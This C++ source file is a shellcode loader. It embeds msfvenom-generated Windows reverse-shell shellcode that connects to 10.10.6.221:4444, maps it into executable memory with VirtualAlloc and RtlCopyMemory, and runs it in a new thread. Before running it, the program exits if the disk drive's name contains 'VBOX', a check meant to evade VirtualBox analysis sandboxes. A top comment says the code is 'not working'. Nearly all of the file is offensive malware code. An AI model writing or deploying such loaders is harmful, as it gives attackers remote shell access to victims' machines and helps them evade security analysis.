// not working

#include <Windows.h>
#include <iostream>
#include <setupapi.h> //HDEVINFO
#include <devguid.h> // GUID_DEVCLASS_DISKDRIVE

using namespace std;

int main() {
	/*
	msfvenom - p windows / shell_reverse_tcp LHOST = 10.10.6.221 LPORT = 4444 - f c
		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
		[-] No arch selected, selecting arch : x86 from the payload
		No encoder specified, outputting raw payload
		Payload size : 324 bytes
		Final size of c file : 1386 bytes
	*/
	unsigned char buf[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
		"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
		"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
		"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x06\xdd\x68"
		"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
		"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
		"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
		"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
		"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
		"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
		"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
		"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";


	/*
		LPVOID VirtualAlloc(
	  [in, optional] LPVOID lpAddress,
	  [in]           SIZE_T dwSize,
	  [in]           DWORD  flAllocationType,
	  [in]           DWORD  flProtect
	);*/

	cout << "\nsize of buf: " << sizeof buf;

	LPVOID shellcode_exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	/*
	   void RtlCopyMemory(
	   void*       Destination,
	   const void* Source,
	   size_t      Length
	);
	*/
	
	RtlCopyMemory(shellcode_exec, buf, sizeof buf);

	DWORD threadId;

	HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
	SP_DEVINFO_DATA deviceInfoData;
	deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);
	DWORD propertyBufferSize;
	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
	PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
	CharUpperW(HDDName);
	if (wcsstr(HDDName, L"VBOX")) return false;



	/*
	HANDLE CreateThread(
	[in, optional] LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		[in]            SIZE_T                  dwStackSize,
		[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
		[in, optional]  __drv_aliasesMem LPVOID lpParameter,
		[in]            DWORD                   dwCreationFlags,
		[out, optional] LPDWORD                 lpThreadId
		);
	*/

	HANDLE hthread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadId);
	WaitForSingleObject(hthread, INFINITE);

	return 0;

}